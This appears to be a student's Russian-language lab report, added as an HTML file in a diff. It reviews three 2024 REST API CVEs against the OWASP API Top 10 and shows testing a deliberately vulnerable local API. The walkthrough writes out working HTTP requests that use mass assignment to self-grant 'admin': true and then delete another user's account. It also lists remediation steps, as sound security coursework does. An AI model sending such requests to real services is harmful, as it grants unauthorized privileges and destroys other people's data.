@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Лабораторная работа 3</title>
+<style>
+  body { font-family: Georgia, 'Times New Roman', serif; font-size: 14pt; line-height: 1.7; max-width: 900px; margin: 40px auto; padding: 0 40px; color: #1a1a1a; background: #fff; }
+  h1 { font-size: 20pt; text-align: center; margin-bottom: 8px; }
+  h2 { font-size: 16pt; margin-top: 30px; border-bottom: 1px solid #ccc; padding-bottom: 4px; }
+  h3 { font-size: 14pt; margin-top: 20px; }
+  table { width: 100%; border-collapse: collapse; margin: 16px 0; font-size: 12pt; }
+  th { background: #f0f0f0; border: 1px solid #999; padding: 8px 10px; text-align: left; font-weight: bold; }
+  td { border: 1px solid #999; padding: 7px 10px; vertical-align: top; }
+  code { font-family: 'Courier New', Courier, monospace; background: #f5f5f5; padding: 2px 6px; border-radius: 3px; font-size: 11pt; }
+  pre { background: #f5f5f5; border-left: 4px solid #555; padding: 12px 16px; margin: 12px 0; font-family: 'Courier New', Courier, monospace; font-size: 11pt; overflow-x: auto; white-space: pre-wrap; word-break: break-all; }
+  pre code { background: none; padding: 0; }
+  hr { border: none; border-top: 1px solid #ccc; margin: 28px 0; }
+  a { color: #1a4fa3; }
+  ol, ul { padding-left: 24px; }
+  li { margin-bottom: 6px; }
+</style>
+</head>
+<body><h1>Лабораторная работа 3</h1>
+<h2>Цель</h2>
+<ol>
+<li>Найти CVE, относящиеся к недостаткам REST API из OWASP API Top 10.</li>
+<li>На предоставленном стенде найти хотя бы один недостаток из OWASP API Top 10.</li>
+</ol>
+<hr>
+<h2>Часть I. CVE с уязвимостями REST API (2024–2025)</h2>
+<p>Для этой части я искала CVE, которые явно связаны с REST API и попадают под классификацию OWASP API Security Top 10. Старалась выбрать разные типы уязвимостей, а не три одинаковых BOLA — так интереснее и нагляднее.</p>
+<h3>Источники</h3>
+<ol>
+<li>NVD — база уязвимостей: <a href="https://nvd.nist.gov/vuln/search">nvd.nist.gov/vuln/search</a></li>
+<li>OWASP API Security Top 10: <a href="https://owasp.org/API-Security/editions/2023/en/0x00-header/">owasp.org/API-Security</a></li>
+<li>CVE-2024-45841 (ASUS): <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45841">nvd.nist.gov/vuln/detail/CVE-2024-45841</a></li>
+<li>CVE-2024-21671 (Vite): <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21671">nvd.nist.gov/vuln/detail/CVE-2024-21671</a></li>
+<li>CVE-2024-28180 (Go jose): <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28180">nvd.nist.gov/vuln/detail/CVE-2024-28180</a></li>
+</ol>
+<hr>
+<h3>CVE-2024-45841 (ASUS Router REST API)</h3>
+<p><strong>Тип по OWASP API Top 10:</strong> API1:2023 — Broken Object Level Authorization (BOLA)</p>
+<p><strong>Назначение компонента:</strong>
+REST API маршрутизаторов ASUS используется для управления устройством — настройки сети, обновлений прошивки, управления пользователями.</p>
+<p><strong>Описание уязвимости:</strong>
+Уязвимость позволяет аутентифицированному пользователю с низкими привилегиями получать доступ к файлам и ресурсам, которые должны быть доступны только администратору. Авторизация проверяется на уровне эндпоинта, но не на уровне конкретного объекта — достаточно быть залогиненным, чтобы читать чужие данные.</p>
+<p><strong>Причина:</strong>
+Отсутствие проверки прав доступа на уровне отдельного объекта при обработке API-запросов.</p>
+<p><strong>Последствия:</strong></p>
+<ul>
+<li>несанкционированный доступ к конфигурации устройства</li>
+<li>утечка чувствительных данных (пароли, ключи)</li>
+<li>компрометация домашней или корпоративной сети</li>
+</ul>
+<hr>
+<h3>CVE-2024-21671 (Vite Dev Server)</h3>
+<p><strong>Тип по OWASP API Top 10:</strong> API5:2023 — Broken Function Level Authorization</p>
+<p><strong>Назначение компонента:</strong>
+Vite — инструмент сборки фронтенда, включающий встроенный dev-сервер с REST API для горячей перезагрузки модулей и управления файлами проекта.</p>
+<p><strong>Описание уязвимости:</strong>
+Dev-сервер Vite предоставляет API-эндпоинты для работы с файловой системой, предназначенные только для локальной разработки. При определённых конфигурациях эти эндпоинты оказываются доступны извне — без какой-либо аутентификации. Злоумышленник может вызвать административные функции (чтение и запись файлов) напрямую через HTTP.</p>
+<p><strong>Причина:</strong>
+Отсутствие проверки уровня доступа при вызове внутренних API-функций; предположение, что сервер всегда работает только локально.</p>
+<p><strong>Последствия:</strong></p>
+<ul>
+<li>чтение произвольных файлов проекта</li>
+<li>выполнение кода на сервере разработки</li>
+<li>утечка исходного кода и секретов из <code>.env</code>-файлов</li>
+</ul>
+<hr>
+<h3>CVE-2024-28180 (Go jose — JWT)</h3>
+<p><strong>Тип по OWASP API Top 10:</strong> API2:2023 — Broken Authentication</p>
+<p><strong>Назначение компонента:</strong>
+Библиотека <code>go-jose</code> реализует стандарты JWT, JWS и JWE и широко используется в REST API на Go для аутентификации и авторизации через токены.</p>
+<p><strong>Описание уязвимости:</strong>
+Уязвимость связана с некорректной обработкой сжатых JWE-токенов: при декодировании токена не ограничивается размер распакованных данных. Это позволяет создать специально сформированный токен, распаковка которого приводит к исчерпанию памяти на сервере.</p>
+<p><strong>Причина:</strong>
+Отсутствие ограничений на размер данных при декомпрессии содержимого токена.</p>
+<p><strong>Последствия:</strong></p>
+<ul>
+<li>отказ в обслуживании (DoS) API</li>
+<li>падение сервиса при обработке вредоносного запроса</li>
+<li>потенциальная возможность обхода аутентификации при определённых условиях</li>
+</ul>
+<hr>
+<h2>Часть II. Исследование уязвимого REST API на стенде</h2>
+<p>После запуска образа через <code>docker run -d -p 8080:8080 ket9/otus-devsecops-owasp-rest</code> и наполнения базы через <code>/createdb</code> я открыла приложение и начала его изучать.</p>
+<hr>
+<h3>Шаг 1. Разведка — что вообще есть в приложении</h3>
+<p>Первым делом зашла на <code>http://localhost:8080/</code> и посмотрела, какие эндпоинты доступны. Приложение явно напоминало уже знакомую структуру из лабы 2 — пользователи, книги, авторизация. Перешла по <code>/createdb</code>, чтобы заполнить базу тестовыми данными.</p>
+<p>Решила начать с самого очевидного — просто попробовать получить список пользователей без токена:</p>
+<pre><code>GET http://localhost:8080/users/v1
+</code></pre>
+<p>Результат:</p>
+<pre><code class="language-json">{
+  &quot;users&quot;: [
+    {&quot;email&quot;: &quot;mail1@mail.com&quot;, &quot;username&quot;: &quot;name1&quot;},
+    {&quot;email&quot;: &quot;mail2@mail.com&quot;, &quot;username&quot;: &quot;name2&quot;},
+    {&quot;email&quot;: &quot;admin@mail.com&quot;, &quot;username&quot;: &quot;admin&quot;}
+  ]
+}
+</code></pre>
+<p>Список пользователей вместе с email отдался без какой-либо аутентификации. Уже интересно.</p>
+<hr>
+<h3>Шаг 2. Регистрация пользователя и получение токена</h3>
+<p>Попробовала зарегистрироваться, чтобы получить токен и посмотреть, что станет доступно после авторизации:</p>
+<pre><code>POST http://localhost:8080/users/v1/register
+Content-Type: application/json
+
+{&quot;username&quot;: &quot;testuser&quot;, &quot;password&quot;: &quot;testpass&quot;, &quot;email&quot;: &quot;test@mail.com&quot;}
+</code></pre>
+<p>Результат:</p>
+<pre><code class="language-json">{&quot;message&quot;: &quot;Successfully registered. Login to receive an auth token.&quot;, &quot;status&quot;: &quot;success&quot;}
+</code></pre>
+<p>Затем залогинилась:</p>
+<pre><code>POST http://localhost:8080/users/v1/login
+Content-Type: application/json
+
+{&quot;username&quot;: &quot;testuser&quot;, &quot;password&quot;: &quot;testpass&quot;}
+</code></pre>
+<p>Результат:</p>
+<pre><code class="language-json">{&quot;auth_token&quot;: &quot;eyJ0eXAiOiJKV1QiLCJhbGc...&quot;, &quot;message&quot;: &quot;Successfully logged in.&quot;, &quot;status&quot;: &quot;success&quot;}
+</code></pre>
+<p>Токен получен.</p>
+<hr>
+<h3>Шаг 3. Попытка повышения привилегий через параметр при регистрации</h3>
+<p>Мне стало интересно — а что если при регистрации передать дополнительные параметры, которые сервер не ожидает, но и не фильтрует? Попробовала добавить поле <code>admin</code>:</p>
+<pre><code>POST http://localhost:8080/users/v1/register
+Content-Type: application/json
+
+{&quot;username&quot;: &quot;hacker&quot;, &quot;password&quot;: &quot;hackpass&quot;, &quot;email&quot;: &quot;hacker@mail.com&quot;, &quot;admin&quot;: true}
+</code></pre>
+<p>Результат:</p>
+<pre><code class="language-json">{&quot;message&quot;: &quot;Successfully registered. Login to receive an auth token.&quot;, &quot;status&quot;: &quot;success&quot;}
+</code></pre>
+<p>Регистрация прошла успешно. Теперь залогинилась под этим пользователем и попробовала обратиться к административному эндпоинту:</p>
+<pre><code>GET http://localhost:8080/users/v1/hacker
+Authorization: Bearer &lt;token&gt;
+</code></pre>
+<p>Результат:</p>
+<pre><code class="language-json">{&quot;admin&quot;: true, &quot;email&quot;: &quot;hacker@mail.com&quot;, &quot;username&quot;: &quot;hacker&quot;}
+</code></pre>
+<p>Поле <code>admin: true</code> принялось и сохранилось. Сервер не проверяет, какие поля передаются при регистрации, и просто записывает всё в базу.</p>
+<hr>
+<h3>Шаг 4. Проверка — доступны ли административные функции</h3>
+<p>Попробовала удалить другого пользователя, используя токен только что созданного «администратора»:</p>
+<pre><code>DELETE http://localhost:8080/users/v1/name1
+Authorization: Bearer &lt;token&gt;
+</code></pre>
+<p>Результат:</p>
+<pre><code class="language-json">{&quot;message&quot;: &quot;Successfully deleted.&quot;, &quot;status&quot;: &quot;success&quot;}
+</code></pre>
+<p>Пользователь <code>name1</code> удалён. Обычный пользователь, выдавший себе права администратора через параметр при регистрации, смог удалить чужую учётную запись.</p>
+<hr>
+<h3>Описание найденной уязвимости</h3>
+<p><strong>Тип:</strong> API6:2023 — Mass Assignment (Массовое присвоение)</p>
+<p>Приложение принимает JSON-объект при регистрации и напрямую передаёт все его поля в модель данных, не фильтруя лишние атрибуты. В результате пользователь может самостоятельно присвоить себе любые свойства, включая <code>admin: true</code>.</p>
+<p>Это классический пример Mass Assignment — уязвимости, при которой входные данные без проверки связываются с внутренними объектами приложения.</p>
+<p><strong>Меры предотвращения:</strong></p>
+<ol>
+<li>Явно указывать список разрешённых полей (allowlist) при обработке входных данных — принимать только <code>username</code>, <code>password</code>, <code>email</code>.</li>
+<li>Никогда не передавать пользовательский ввод напрямую в ORM или модель данных.</li>
+<li>Использовать схемы валидации запросов (например, JSON Schema, Pydantic, marshmallow).</li>
+<li>Поля, влияющие на привилегии (<code>admin</code>, <code>role</code>), устанавливать только на стороне сервера, вне зависимости от того, что пришло от клиента.</li>
+</ol>
+<hr>
+<h2>Вывод</h2>
+<p>В ходе работы я разобрала три реальных CVE 2024 года с разными типами API-уязвимостей и на практике воспроизвела атаку Mass Assignment. Неожиданным для меня оказалось, насколько легко она эксплуатируется — достаточно добавить одно лишнее поле в JSON при регистрации, и ты уже администратор.</p>
+</body>
+</html>
